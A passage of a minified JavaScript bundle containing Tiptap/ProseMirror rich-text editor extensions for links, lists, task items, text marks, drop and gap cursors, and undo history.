a=OE(e.state,t.type.name),l=(i=o==null?void 0:o.href)!=null?i:a.href,u=(s=o==null?void 0:o.target)!=null?s:a.target;return t.enableClickSelection&&t.editor.commands.extendMarkRange(t.type.name),o&&l?(window.open(l,u),!0):!1}}})}function qz(t){return new we({key:new ze("handlePasteLink"),props:{handlePaste:(e,n,r)=>{const{state:i}=e,{selection:s}=i,{empty:o}=s;if(o)return!1;let a="";r.content.forEach(u=>{a+=u.textContent});const l=dT(a,{defaultProtocol:t.defaultProtocol}).find(u=>u.isLink&&u.value===a);return!a||!l?!1:t.editor.commands.setMark(t.type,{href:l.href})}}})}function Hr(t,e){const n=["http","https","ftp","ftps","mailto","tel","callto","sms","cid","xmpp"];return e&&e.forEach(r=>{const i=typeof r=="string"?r:r.scheme;i&&n.push(i)}),!t||t.replace(Hz,"").match(new RegExp(`^(?:(?:${n.join("|")}):|[^a-z]|[a-z0-9+.-]+(?:[^a-z+.-:]|$))`,"i"))}var Gz=Pi.create({name:"link",priority:1e3,keepOnSplit:!1,exitable:!0,onCreate(){this.options.validate&&!this.options.shouldAutoLink&&(this.options.shouldAutoLink=this.options.validate,console.warn("The `validate` option is deprecated. Rename to the `shouldAutoLink` option instead.")),this.options.protocols.forEach(t=>{if(typeof t=="string"){r1(t);return}r1(t.scheme,t.optionalSlashes)})},onDestroy(){Vz()},inclusive(){return this.options.autolink},addOptions(){return{openOnClick:!0,enableClickSelection:!1,linkOnPaste:!0,autolink:!0,protocols:[],defaultProtocol:"http",HTMLAttributes:{target:"_blank",rel:"noopener noreferrer nofollow",class:null},isAllowedUri:(t,e)=>!!Hr(t,e.protocols),validate:t=>!!t,shouldAutoLink:t=>!!t}},addAttributes(){return{href:{default:null,parseHTML(t){return t.getAttribute("href")}},target:{default:this.options.HTMLAttributes.target},rel:{default:this.options.HTMLAttributes.rel},class:{default:this.options.HTMLAttributes.class}}},parseHTML(){return[{tag:"a[href]",getAttrs:t=>{const e=t.getAttribute("href");return!e||!this.options.isAllowedUri(e,{defaultValidate:n=>!!Hr(n,this.options.protocols),protocols:this.options.protocols,defaultProtocol:this.options.defaultProtocol})?!1:null}}]},renderHTML({HTMLAttributes:t}){return this.options.isAllowedUri(t.href,{defaultValidate:e=>!!Hr(e,this.options.protocols),protocols:this.options.protocols,defaultProtocol:this.options.defaultProtocol})?["a",Me(this.options.HTMLAttributes,t),0]:["a",Me(this.options.HTMLAttributes,{...t,href:""}),0]},addCommands(){return{setLink:t=>({chain:e})=>{const{href:n}=t;return this.options.isAllowedUri(n,{defaultValidate:r=>!!Hr(r,this.options.protocols),protocols:this.options.protocols,defaultProtocol:this.options.defaultProtocol})?e().setMark(this.name,t).setMeta("preventAutolink",!0).run():!1},toggleLink:t=>({chain:e})=>{const{href:n}=t||{};return n&&!this.options.isAllowedUri(n,{defaultValidate:r=>!!Hr(r,this.options.protocols),protocols:this.options.protocols,defaultProtocol:this.options.defaultProtocol})?!1:e().toggleMark(this.name,t,{extendEmptyMarkRange:!0}).setMeta("preventAutolink",!0).run()},unsetLink:()=>({chain:t})=>t().unsetMark(this.name,{extendEmptyMarkRange:!0}).setMeta("preventAutolink",!0).run()}},addPasteRules(){return[Ei({find:t=>{const e=[];if(t){const{protocols:n,defaultProtocol:r}=this.options,i=dT(t).filter(s=>s.isLink&&this.options.isAllowedUri(s.value,{defaultValidate:o=>!!Hr(o,n),protocols:n,defaultProtocol:r}));i.length&&i.forEach(s=>e.push({text:s.value,data:{href:s.href},index:s.start}))}return e},type:this.type,getAttributes:t=>{var e;return{href:(e=t.data)==null?void 0:e.href}}})]},addProseMirrorPlugins(){const t=[],{protocols:e,defaultProtocol:n}=this.options;return this.options.autolink&&t.push(Wz({type:this.type,defaultProtocol:this.options.defaultProtocol,validate:r=>this.options.isAllowedUri(r,{defaultValidate:i=>!!Hr(i,e),protocols:e,defaultProtocol:n}),shouldAutoLink:this.options.shouldAutoLink})),this.options.openOnClick===!0&&t.push(Kz({type:this.type,editor:this.editor,enableClickSelection:this.options.enableClickSelection})),this.options.linkOnPaste&&t.push(qz({editor:this.editor,defaultProtocol:this.options.defaultProtocol,type:this.type})),t}}),Jz=Object.defineProperty,Yz=(t,e)=>{for(var n in e)Jz(t,n,{get:e[n],enumerable:!0})},Qz="listItem",i1="textStyle",s1=/^\s*([-+*])\s$/,fT=Ot.create({name:"bulletList",addOptions(){return{itemTypeName:"listItem",HTMLAttributes:{},keepMarks:!1,keepAttributes:!1}},group:"block list",content(){return`${this.options.itemTypeName}+`},parseHTML(){return[{tag:"ul"}]},renderHTML({HTMLAttributes:t}){return["ul",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{toggleBulletList:()=>({commands:t,chain:e})=>this.options.keepAttributes?e().toggleList(this.name,this.options.itemTypeName,this.options.keepMarks).updateAttributes(Qz,this.editor.getAttributes(i1)).run():t.toggleList(this.name,this.options.itemTypeName,this.options.keepMarks)}},addKeyboardShortcuts(){return{"Mod-Shift-8":()=>this.editor.commands.toggleBulletList()}},addInputRules(){let t=As({find:s1,type:this.type});return(this.options.keepMarks||this.options.keepAttributes)&&(t=As({find:s1,type:this.type,keepMarks:this.options.keepMarks,keepAttributes:this.options.keepAttributes,getAttributes:()=>this.editor.getAttributes(i1),editor:this.editor})),[t]}}),hT=Ot.create({name:"listItem",addOptions(){return{HTMLAttributes:{},bulletListTypeName:"bulletList",orderedListTypeName:"orderedList"}},content:"paragraph block*",defining:!0,parseHTML(){return[{tag:"li"}]},renderHTML({HTMLAttributes:t}){return["li",Me(this.options.HTMLAttributes,t),0]},addKeyboardShortcuts(){return{Enter:()=>this.editor.commands.splitListItem(this.name),Tab:()=>this.editor.commands.sinkListItem(this.name),"Shift-Tab":()=>this.editor.commands.liftListItem(this.name)}}}),Xz={};Yz(Xz,{findListItemPos:()=>_a,getNextListDepth:()=>Wg,handleBackspace:()=>Sp,handleDelete:()=>kp,hasListBefore:()=>pT,hasListItemAfter:()=>Zz,hasListItemBefore:()=>mT,listItemHasSubList:()=>gT,nextListIsDeeper:()=>yT,nextListIsHigher:()=>xT});var _a=(t,e)=>{const{$from:n}=e.selection,r=Ne(t,e.schema);let i=null,s=n.depth,o=n.pos,a=null;for(;s>0&&a===null;)i=n.node(s),i.type===r?a=s:(s-=1,o-=1);return a===null?null:{$pos:e.doc.resolve(o),depth:a}},Wg=(t,e)=>{const n=_a(t,e);if(!n)return!1;const[,r]=XF(e,t,n.$pos.pos+4);return r},pT=(t,e,n)=>{const{$anchor:r}=t.selection,i=Math.max(0,r.pos-2),s=t.doc.resolve(i).node();return!(!s||!n.includes(s.type.name))},mT=(t,e)=>{var n;const{$anchor:r}=e.selection,i=e.doc.resolve(r.pos-2);return!(i.index()===0||((n=i.nodeBefore)==null?void 0:n.type.name)!==t)},gT=(t,e,n)=>{if(!n)return!1;const r=Ne(t,e.schema);let i=!1;return n.descendants(s=>{s.type===r&&(i=!0)}),i},Sp=(t,e,n)=>{if(t.commands.undoInputRule())return!0;if(t.state.selection.from!==t.state.selection.to)return!1;if(!Lr(t.state,e)&&pT(t.state,e,n)){const{$anchor:a}=t.state.selection,l=t.state.doc.resolve(a.before()-1),u=[];l.node().descendants((f,h)=>{f.type.name===e&&u.push({node:f,pos:h})});const c=u.at(-1);if(!c)return!1;const d=t.state.doc.resolve(l.start()+c.pos+1);return t.chain().cut({from:a.start()-1,to:a.end()+1},d.end()).joinForward().run()}if(!Lr(t.state,e)||!nB(t.state))return!1;const r=_a(e,t.state);if(!r)return!1;const s=t.state.doc.resolve(r.$pos.pos-2).node(r.depth),o=gT(e,t.state,s);return mT(e,t.state)&&!o?t.commands.joinItemBackward():t.chain().liftListItem(e).run()},yT=(t,e)=>{const n=Wg(t,e),r=_a(t,e);return!r||!n?!1:n>r.depth},xT=(t,e)=>{const n=Wg(t,e),r=_a(t,e);return!r||!n?!1:n<r.depth},kp=(t,e)=>{if(!Lr(t.state,e)||!tB(t.state,e))return!1;const{selection:n}=t.state,{$from:r,$to:i}=n;return!n.empty&&r.sameParent(i)?!1:yT(e,t.state)?t.chain().focus(t.state.selection.from+4).lift(e).joinBackward().run():xT(e,t.state)?t.chain().joinForward().joinBackward().run():t.commands.joinItemForward()},Zz=(t,e)=>{var n;const{$anchor:r}=e.selection,i=e.doc.resolve(r.pos-r.parentOffset-2);return!(i.index()===i.parent.childCount-1||((n=i.nodeAfter)==null?void 0:n.type.name)!==t)},vT=Ae.create({name:"listKeymap",addOptions(){return{listTypes:[{itemName:"listItem",wrapperNames:["bulletList","orderedList"]},{itemName:"taskItem",wrapperNames:["taskList"]}]}},addKeyboardShortcuts(){return{Delete:({editor:t})=>{let e=!1;return this.options.listTypes.forEach(({itemName:n})=>{t.state.schema.nodes[n]!==void 0&&kp(t,n)&&(e=!0)}),e},"Mod-Delete":({editor:t})=>{let e=!1;return this.options.listTypes.forEach(({itemName:n})=>{t.state.schema.nodes[n]!==void 0&&kp(t,n)&&(e=!0)}),e},Backspace:({editor:t})=>{let e=!1;return this.options.listTypes.forEach(({itemName:n,wrapperNames:r})=>{t.state.schema.nodes[n]!==void 0&&Sp(t,n,r)&&(e=!0)}),e},"Mod-Backspace":({editor:t})=>{let e=!1;return this.options.listTypes.forEach(({itemName:n,wrapperNames:r})=>{t.state.schema.nodes[n]!==void 0&&Sp(t,n,r)&&(e=!0)}),e}}}}),e_="listItem",o1="textStyle",a1=/^(\d+)\.\s$/,wT=Ot.create({name:"orderedList",addOptions(){return{itemTypeName:"listItem",HTMLAttributes:{},keepMarks:!1,keepAttributes:!1}},group:"block list",content(){return`${this.options.itemTypeName}+`},addAttributes(){return{start:{default:1,parseHTML:t=>t.hasAttribute("start")?parseInt(t.getAttribute("start")||"",10):1},type:{default:null,parseHTML:t=>t.getAttribute("type")}}},parseHTML(){return[{tag:"ol"}]},renderHTML({HTMLAttributes:t}){const{start:e,...n}=t;return e===1?["ol",Me(this.options.HTMLAttributes,n),0]:["ol",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{toggleOrderedList:()=>({commands:t,chain:e})=>this.options.keepAttributes?e().toggleList(this.name,this.options.itemTypeName,this.options.keepMarks).updateAttributes(e_,this.editor.getAttributes(o1)).run():t.toggleList(this.name,this.options.itemTypeName,this.options.keepMarks)}},addKeyboardShortcuts(){return{"Mod-Shift-7":()=>this.editor.commands.toggleOrderedList()}},addInputRules(){let t=As({find:a1,type:this.type,getAttributes:e=>({start:+e[1]}),joinPredicate:(e,n)=>n.childCount+n.attrs.start===+e[1]});return(this.options.keepMarks||this.options.keepAttributes)&&(t=As({find:a1,type:this.type,keepMarks:this.options.keepMarks,keepAttributes:this.options.keepAttributes,getAttributes:e=>({start:+e[1],...this.editor.getAttributes(o1)}),joinPredicate:(e,n)=>n.childCount+n.attrs.start===+e[1],editor:this.editor})),[t]}}),t_=/^\s*(\[([( |x])?\])\s$/,n_=Ot.create({name:"taskItem",addOptions(){return{nested:!1,HTMLAttributes:{},taskListTypeName:"taskList",a11y:void 0}},content(){return this.options.nested?"paragraph block*":"paragraph+"},defining:!0,addAttributes(){return{checked:{default:!1,keepOnSplit:!1,parseHTML:t=>{const e=t.getAttribute("data-checked");return e===""||e==="true"},renderHTML:t=>({"data-checked":t.checked})}}},parseHTML(){return[{tag:`li[data-type="${this.name}"]`,priority:51}]},renderHTML({node:t,HTMLAttributes:e}){return["li",Me(this.options.HTMLAttributes,e,{"data-type":this.name}),["label",["input",{type:"checkbox",checked:t.attrs.checked?"checked":null}],["span"]],["div",0]]},addKeyboardShortcuts(){const t={Enter:()=>this.editor.commands.splitListItem(this.name),"Shift-Tab":()=>this.editor.commands.liftListItem(this.name)};return this.options.nested?{...t,Tab:()=>this.editor.commands.sinkListItem(this.name)}:t},addNodeView(){return({node:t,HTMLAttributes:e,getPos:n,editor:r})=>{const i=document.createElement("li"),s=document.createElement("label"),o=document.createElement("span"),a=document.createElement("input"),l=document.createElement("div"),u=c=>{var d,f;a.ariaLabel=((f=(d=this.options.a11y)==null?void 0:d.checkboxLabel)==null?void 0:f.call(d,c,a.checked))||`Task item checkbox for ${c.textContent||"empty task item"}`};return u(t),s.contentEditable="false",a.type="checkbox",a.addEventListener("mousedown",c=>c.preventDefault()),a.addEventListener("change",c=>{if(!r.isEditable&&!this.options.onReadOnlyChecked){a.checked=!a.checked;return}const{checked:d}=c.target;r.isEditable&&typeof n=="function"&&r.chain().focus(void 0,{scrollIntoView:!1}).command(({tr:f})=>{const h=n();if(typeof h!="number")return!1;const p=f.doc.nodeAt(h);return f.setNodeMarkup(h,void 0,{...p==null?void 0:p.attrs,checked:d}),!0}).run(),!r.isEditable&&this.options.onReadOnlyChecked&&(this.options.onReadOnlyChecked(t,d)||(a.checked=!a.checked))}),Object.entries(this.options.HTMLAttributes).forEach(([c,d])=>{i.setAttribute(c,d)}),i.dataset.checked=t.attrs.checked,a.checked=t.attrs.checked,s.append(a,o),i.append(s,l),Object.entries(e).forEach(([c,d])=>{i.setAttribute(c,d)}),{dom:i,contentDOM:l,update:c=>c.type!==this.type?!1:(i.dataset.checked=c.attrs.checked,a.checked=c.attrs.checked,u(c),!0)}}},addInputRules(){return[As({find:t_,type:this.type,getAttributes:t=>({checked:t[t.length-1]==="x"})})]}}),r_=Ot.create({name:"taskList",addOptions(){return{itemTypeName:"taskItem",HTMLAttributes:{}}},group:"block list",content(){return`${this.options.itemTypeName}+`},parseHTML(){return[{tag:`ul[data-type="${this.name}"]`,priority:51}]},renderHTML({HTMLAttributes:t}){return["ul",Me(this.options.HTMLAttributes,t,{"data-type":this.name}),0]},addCommands(){return{toggleTaskList:()=>({commands:t})=>t.toggleList(this.name,this.options.itemTypeName)}},addKeyboardShortcuts(){return{"Mod-Shift-9":()=>this.editor.commands.toggleTaskList()}}});Ae.create({name:"listKit",addExtensions(){const t=[];return this.options.bulletList!==!1&&t.push(fT.configure(this.options.bulletList)),this.options.listItem!==!1&&t.push(hT.configure(this.options.listItem)),this.options.listKeymap!==!1&&t.push(vT.configure(this.options.listKeymap)),this.options.orderedList!==!1&&t.push(wT.configure(this.options.orderedList)),this.options.taskItem!==!1&&t.push(n_.configure(this.options.taskItem)),this.options.taskList!==!1&&t.push(r_.configure(this.options.taskList)),t}});var i_=Ot.create({name:"paragraph",priority:1e3,addOptions(){return{HTMLAttributes:{}}},group:"block",content:"inline*",parseHTML(){return[{tag:"p"}]},renderHTML({HTMLAttributes:t}){return["p",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{setParagraph:()=>({commands:t})=>t.setNode(this.name)}},addKeyboardShortcuts(){return{"Mod-Alt-0":()=>this.editor.commands.setParagraph()}}}),s_=/(?:^|\s)(~~(?!\s+~~)((?:[^~]+))~~(?!\s+~~))$/,o_=/(?:^|\s)(~~(?!\s+~~)((?:[^~]+))~~(?!\s+~~))/g,a_=Pi.create({name:"strike",addOptions(){return{HTMLAttributes:{}}},parseHTML(){return[{tag:"s"},{tag:"del"},{tag:"strike"},{style:"text-decoration",consuming:!1,getAttrs:t=>t.includes("line-through")?{}:!1}]},renderHTML({HTMLAttributes:t}){return["s",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{setStrike:()=>({commands:t})=>t.setMark(this.name),toggleStrike:()=>({commands:t})=>t.toggleMark(this.name),unsetStrike:()=>({commands:t})=>t.unsetMark(this.name)}},addKeyboardShortcuts(){return{"Mod-Shift-s":()=>this.editor.commands.toggleStrike()}},addInputRules(){return[Ns({find:s_,type:this.type})]},addPasteRules(){return[Ei({find:o_,type:this.type})]}}),l_=Ot.create({name:"text",group:"inline"}),u_=Pi.create({name:"underline",addOptions(){return{HTMLAttributes:{}}},parseHTML(){return[{tag:"u"},{style:"text-decoration",consuming:!1,getAttrs:t=>t.includes("underline")?{}:!1}]},renderHTML({HTMLAttributes:t}){return["u",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{setUnderline:()=>({commands:t})=>t.setMark(this.name),toggleUnderline:()=>({commands:t})=>t.toggleMark(this.name),unsetUnderline:()=>({commands:t})=>t.unsetMark(this.name)}},addKeyboardShortcuts(){return{"Mod-u":()=>this.editor.commands.toggleUnderline(),"Mod-U":()=>this.editor.commands.toggleUnderline()}}});function c_(t={}){return new we({view(e){return new d_(e,t)}})}class d_{constructor(e,n){var r;this.editorView=e,this.cursorPos=null,this.element=null,this.timeout=-1,this.width=(r=n.width)!==null&&r!==void 0?r:1,this.color=n.color===!1?void 0:n.color||"black",this.class=n.class,this.handlers=["dragover","dragend","drop","dragleave"].map(i=>{let s=o=>{this[i](o)};return e.dom.addEventListener(i,s),{name:i,handler:s}})}destroy(){this.handlers.forEach(({name:e,handler:n})=>this.editorView.dom.removeEventListener(e,n))}update(e,n){this.cursorPos!=null&&n.doc!=e.state.doc&&(this.cursorPos>e.state.doc.content.size?this.setCursor(null):this.updateOverlay())}setCursor(e){e!=this.cursorPos&&(this.cursorPos=e,e==null?(this.element.parentNode.removeChild(this.element),this.element=null):this.updateOverlay())}updateOverlay(){let e=this.editorView.state.doc.resolve(this.cursorPos),n=!e.parent.inlineContent,r,i=this.editorView.dom,s=i.getBoundingClientRect(),o=s.width/i.offsetWidth,a=s.height/i.offsetHeight;if(n){let d=e.nodeBefore,f=e.nodeAfter;if(d||f){let h=this.editorView.nodeDOM(this.cursorPos-(d?d.nodeSize:0));if(h){let p=h.getBoundingClientRect(),y=d?p.bottom:p.top;d&&f&&(y=(y+this.editorView.nodeDOM(this.cursorPos).getBoundingClientRect().top)/2);let x=this.width/2*a;r={left:p.left,right:p.right,top:y-x,bottom:y+x}}}}if(!r){let d=this.editorView.coordsAtPos(this.cursorPos),f=this.width/2*o;r={left:d.left-f,right:d.left+f,top:d.top,bottom:d.bottom}}let l=this.editorView.dom.offsetParent;this.element||(this.element=l.appendChild(document.createElement("div")),this.class&&(this.element.className=this.class),this.element.style.cssText="position: absolute; z-index: 50; pointer-events: none;",this.color&&(this.element.style.backgroundColor=this.color)),this.element.classList.toggle("prosemirror-dropcursor-block",n),this.element.classList.toggle("prosemirror-dropcursor-inline",!n);let u,c;if(!l||l==document.body&&getComputedStyle(l).position=="static")u=-pageXOffset,c=-pageYOffset;else{let d=l.getBoundingClientRect(),f=d.width/l.offsetWidth,h=d.height/l.offsetHeight;u=d.left-l.scrollLeft*f,c=d.top-l.scrollTop*h}this.element.style.left=(r.left-u)/o+"px",this.element.style.top=(r.top-c)/a+"px",this.element.style.width=(r.right-r.left)/o+"px",this.element.style.height=(r.bottom-r.top)/a+"px"}scheduleRemoval(e){clearTimeout(this.timeout),this.timeout=setTimeout(()=>this.setCursor(null),e)}dragover(e){if(!this.editorView.editable)return;let n=this.editorView.posAtCoords({left:e.clientX,top:e.clientY}),r=n&&n.inside>=0&&this.editorView.state.doc.nodeAt(n.inside),i=r&&r.type.spec.disableDropCursor,s=typeof i=="function"?i(this.editorView,n,e):i;if(n&&!s){let o=n.pos;if(this.editorView.dragging&&this.editorView.dragging.slice){let a=NC(this.editorView.state.doc,o,this.editorView.dragging.slice);a!=null&&(o=a)}this.setCursor(o),this.scheduleRemoval(5e3)}}dragend(){this.scheduleRemoval(20)}drop(){this.scheduleRemoval(20)}dragleave(e){this.editorView.dom.contains(e.relatedTarget)||this.setCursor(null)}}class ve extends W{constructor(e){super(e,e)}map(e,n){let r=e.resolve(n.map(this.head));return ve.valid(r)?new ve(r):W.near(r)}content(){return L.empty}eq(e){return e instanceof ve&&e.head==this.head}toJSON(){return{type:"gapcursor",pos:this.head}}static fromJSON(e,n){if(typeof n.pos!="number")throw new RangeError("Invalid input for GapCursor.fromJSON");return new ve(e.resolve(n.pos))}getBookmark(){return new Kg(this.anchor)}static valid(e){let n=e.parent;if(n.isTextblock||!f_(e)||!h_(e))return!1;let r=n.type.spec.allowGapCursor;if(r!=null)return r;let i=n.contentMatchAt(e.index()).defaultType;return i&&i.isTextblock}static findGapCursorFrom(e,n,r=!1){e:for(;;){if(!r&&ve.valid(e))return e;let i=e.pos,s=null;for(let o=e.depth;;o--){let a=e.node(o);if(n>0?e.indexAfter(o)<a.childCount:e.index(o)>0){s=a.child(n>0?e.indexAfter(o):e.index(o)-1);break}else if(o==0)return null;i+=n;let l=e.doc.resolve(i);if(ve.valid(l))return l}for(;;){let o=n>0?s.firstChild:s.lastChild;if(!o){if(s.isAtom&&!s.isText&&!V.isSelectable(s)){e=e.doc.resolve(i+s.nodeSize*n),r=!1;continue e}break}s=o,i+=n;let a=e.doc.resolve(i);if(ve.valid(a))return a}return null}}}ve.prototype.visible=!1;ve.findFrom=ve.findGapCursorFrom;W.jsonID("gapcursor",ve);class Kg{constructor(e){this.pos=e}map(e){return new Kg(e.map(this.pos))}resolve(e){let n=e.resolve(this.pos);return ve.valid(n)?new ve(n):W.near(n)}}function f_(t){for(let e=t.depth;e>=0;e--){let n=t.index(e),r=t.node(e);if(n==0){if(r.type.spec.isolating)return!0;continue}for(let i=r.child(n-1);;i=i.lastChild){if(i.childCount==0&&!i.inlineContent||i.isAtom||i.type.spec.isolating)return!0;if(i.inlineContent)return!1}}return!0}function h_(t){for(let e=t.depth;e>=0;e--){let n=t.indexAfter(e),r=t.node(e);if(n==r.childCount){if(r.type.spec.isolating)return!0;continue}for(let i=r.child(n);;i=i.firstChild){if(i.childCount==0&&!i.inlineContent||i.isAtom||i.type.spec.isolating)return!0;if(i.inlineContent)return!1}}return!0}function p_(){return new we({props:{decorations:x_,createSelectionBetween(t,e,n){return e.pos==n.pos&&ve.valid(n)?new ve(n):null},handleClick:g_,handleKeyDown:m_,handleDOMEvents:{beforeinput:y_}}})}const m_=gE({ArrowLeft:Sl("horiz",-1),ArrowRight:Sl("horiz",1),ArrowUp:Sl("vert",-1),ArrowDown:Sl("vert",1)});function Sl(t,e){const n=t=="vert"?e>0?"down":"up":e>0?"right":"left";return function(r,i,s){let o=r.selection,a=e>0?o.$to:o.$from,l=o.empty;if(o instanceof $){if(!s.endOfTextblock(n)||a.depth==0)return!1;l=!1,a=r.doc.resolve(e>0?a.after():a.before())}let u=ve.findGapCursorFrom(a,e,l);return u?(i&&i(r.tr.setSelection(new ve(u))),!0):!1}}function g_(t,e,n){if(!t||!t.editable)return!1;let r=t.state.doc.resolve(e);if(!ve.valid(r))return!1;let i=t.posAtCoords({left:n.clientX,top:n.clientY});return i&&i.inside>-1&&V.isSelectable(t.state.doc.nodeAt(i.inside))?!1:(t.dispatch(t.state.tr.setSelection(new ve(r))),!0)}function y_(t,e){if(e.inputType!="insertCompositionText"||!(t.state.selection instanceof ve))return!1;let{$from:n}=t.state.selection,r=n.parent.contentMatchAt(n.index()).findWrapping(t.state.schema.nodes.text);if(!r)return!1;let i=A.empty;for(let o=r.length-1;o>=0;o--)i=A.from(r[o].createAndFill(null,i));let s=t.state.tr.replace(n.pos,n.pos,new L(i,0,0));return s.setSelection($.near(s.doc.resolve(n.pos+1))),t.dispatch(s),!1}function x_(t){if(!(t.selection instanceof ve))return null;let e=document.createElement("div");return e.className="ProseMirror-gapcursor",ue.create(t.doc,[ot.widget(t.selection.head,e,{key:"gapcursor"})])}var pc=200,Be=function(){};Be.prototype.append=function(e){return e.length?(e=Be.from(e),!this.length&&e||e.length<pc&&this.leafAppend(e)||this.length<pc&&e.leafPrepend(this)||this.appendInner(e)):this};Be.prototype.prepend=function(e){return e.length?Be.from(e).append(this):this};Be.prototype.appendInner=function(e){return new v_(this,e)};Be.prototype.slice=function(e,n){return e===void 0&&(e=0),n===void 0&&(n=this.length),e>=n?Be.empty:this.sliceInner(Math.max(0,e),Math.min(this.length,n))};Be.prototype.get=function(e){if(!(e<0||e>=this.length))return this.getInner(e)};Be.prototype.forEach=function(e,n,r){n===void 0&&(n=0),r===void 0&&(r=this.length),n<=r?this.forEachInner(e,n,r,0):this.forEachInvertedInner(e,n,r,0)};Be.prototype.map=function(e,n,r){n===void 0&&(n=0),r===void 0&&(r=this.length);var i=[];return this.forEach(function(s,o){return i.push(e(s,o))},n,r),i};Be.from=function(e){return e instanceof Be?e:e&&e.length?new ST(e):Be.empty};var ST=function(t){function e(r){t.call(this),this.values=r}t&&(e.__proto__=t),e.prototype=Object.create(t&&t.prototype),e.prototype.constructor=e;var n={length:{configurable:!0},depth:{configurable:!0}};return e.prototype.flatten=function(){return this.values},e.prototype.sliceInner=function(i,s){return i==0&&s==this.length?this:new e(this.values.slice(i,s))},e.prototype.getInner=function(i){return this.values[i]},e.prototype.forEachInner=function(i,s,o,a){for(var l=s;l<o;l++)if(i(this.values[l],a+l)===!1)return!1},e.prototype.forEachInvertedInner=function(i,s,o,a){for(var l=s-1;l>=o;l--)if(i(this.values[l],a+l)===!1)return!1},e.prototype.leafAppend=function(i){if(this.length+i.length<=pc)return new e(this.values.concat(i.flatten()))},e.prototype.leafPrepend=function(i){if(this.length+i.length<=pc)return new e(i.flatten().concat(this.values))},n.length.get=function(){return this.values.length},n.depth.get=function(){return 0},Object.defineProperties(e.prototype,n),e}(Be);Be.empty=new ST([]);var v_=function(t){function e(n,r){t.call(this),this.left=n,this.right=r,this.length=n.length+r.length,this.depth=Math.max(n.depth,r.depth)+1}return t&&(e.__proto__=t),e.prototype=Object.create(t&&t.prototype),e.prototype.constructor=e,e.prototype.flatten=function(){return this.left.flatten().concat(this.right.flatten())},e.prototype.getInner=function(r){return r<this.left.length?this.left.get(r):this.right.get(r-this.left.length)},e.prototype.forEachInner=function(r,i,s,o){var a=this.left.length;if(i<a&&this.left.forEachInner(r,i,Math.min(s,a),o)===!1||s>a&&this.right.forEachInner(r,Math.max(i-a,0),Math.min(this.length,s)-a,o+a)===!1)return!1},e.prototype.forEachInvertedInner=function(r,i,s,o){var a=this.left.length;if(i>a&&this.right.forEachInvertedInner(r,i-a,Math.max(s,a)-a,o+a)===!1||s<a&&this.left.forEachInvertedInner(r,Math.min(i,a),s,o)===!1)return!1},e.prototype.sliceInner=function(r,i){if(r==0&&i==this.length)return this;var s=this.left.length;return i<=s?this.left.slice(r,i):r>=s?this.right.slice(r-s,i-s):this.left.slice(r,s).append(this.right.slice(0,i-s))},e.prototype.leafAppend=function(r){var i=this.right.leafAppend(r);if(i)return new e(this.left,i)},e.prototype.leafPrepend=function(r){var i=this.left.leafPrepend(r);if(i)return new e(i,this.right)},e.prototype.appendInner=function(r){return this.left.depth>=Math.max(this.right.depth,r.depth)+1?new e(this.left,new e(this.right,r)):new e(this,r)},e}(Be);const w_=500;class en{constructor(e,n){this.items=e,this.eventCount=n}popEvent(e,n){if(this.eventCount==0)return null;let r=this.items.length;for(;;r--)if(this.items.get(r-1).selection){--r;break}let i,s;n&&(i=this.remapping(r,this.items.length),s=i.maps.length);let o=e.tr,a,l,u=[],c=[];return this.items.forEach((d,f)=>{if(!d.step){i||(i=this.remapping(r,f+1),s=i.maps.length),s--,c.push(d);return}if(i){c.push(new mn(d.map));let h=d.step.map(i.slice(s)),p;h&&o.maybeStep(h).doc&&(p=o.mapping.maps[o.mapping.maps.length-1],u.push(new mn(p,void 0,void 0,u.length+c.length))),s--,p&&i.appendMap(p,s)}else o.maybeStep(d.step);if(d.selection)return a=i?d.selection.map(i.slice(s)):d.selection,l=new en(this.items.slice(0,r).append(c.reverse().concat(u)),this.eventCount-1),!1},this.items.length,0),{remaining:l,transform:o,selection:a}}addTransform(e,n,r,i){let s=[],o=this.eventCount,a=this.items,l=!i&&a.length?a.get(a.length-1):null;for(let c=0;c<e.steps.length;c++){let d=e.steps[c].invert(e.docs[c]),f=new mn(e.mapping.maps[c],d,n),h;(h=l&&l.merge(f))&&(f=h,c?s.pop():a=a.slice(0,a.length-1)),s.push(f),n&&(o++,n=void 0),i||(l=f)}let u=o-r.depth;return u>k_&&(a=S_(a,u),o-=u),new en(a.append(s),o)}remapping(e,n){let r=new fa;return this.items.forEach((i,s)=>{let o=i.mirrorOffset!=null&&s-i.mirrorOffset>=e?r.maps.length-i.mirrorOffset:void 0;r.appendMap(i.map,o)},e,n),r}addMaps(e){return this.eventCount==0?this:new en(this.items.append(e.map(n=>new mn(n))),this.eventCount)}rebased(e,n){if(!this.eventCount)return this;let r=[],i=Math.max(0,this.items.length-n),s=e.mapping,o=e.steps.length,a=this.eventCount;this.items.forEach(f=>{f.selection&&a--},i);let l=n;this.items.forEach(f=>{let h=s.getMirror(--l);if(h==null)return;o=Math.min(o,h);let p=s.maps[h];if(f.step){let y=e.steps[h].invert(e.docs[h]),x=f.selection&&f.selection.map(s.slice(l+1,h));x&&a++,r.push(new mn(p,y,x))}else r.push(new mn(p))},i);let u=[];for(let f=n;f<o;f++)u.push(new mn(s.maps[f]));let c=this.items.slice(0,i).append(u).append(r),d=new en(c,a);return d.emptyItemCount()>w_&&(d=d.compress(this.items.length-r.length)),d}emptyItemCount(){let e=0;return this.items.forEach(n=>{n.step||e++}),e}compress(e=this.items.length){let n=this.remapping(0,e),r=n.maps.length,i=[],s=0;return this.items.forEach((o,a)=>{if(a>=e)i.push(o),o.selection&&s++;else if(o.step){let l=o.step.map(n.slice(r)),u=l&&l.getMap();if(r--,u&&n.appendMap(u,r),l){let c=o.selection&&o.selection.map(n.slice(r));c&&s++;let d=new mn(u.invert(),l,c),f,h=i.length-1;(f=i.length&&i[h].merge(d))?i[h]=f:i.push(d)}}else o.map&&r--},this.items.length,0),new en(Be.from(i.reverse()),s)}}en.empty=new en(Be.empty,0);function S_(t,e){let n;return t.forEach((r,i)=>{if(r.selection&&e--==0)return n=i,!1}),t.slice(n)}class mn{constructor(e,n,r,i){this.map=e,this.step=n,this.selection=r,this.mirrorOffset=i}merge(e){if(this.step&&e.step&&!e.selection){let n=e.step.merge(this.step);if(n)return new mn(n.getMap().invert(),n,this.selection)}}}class 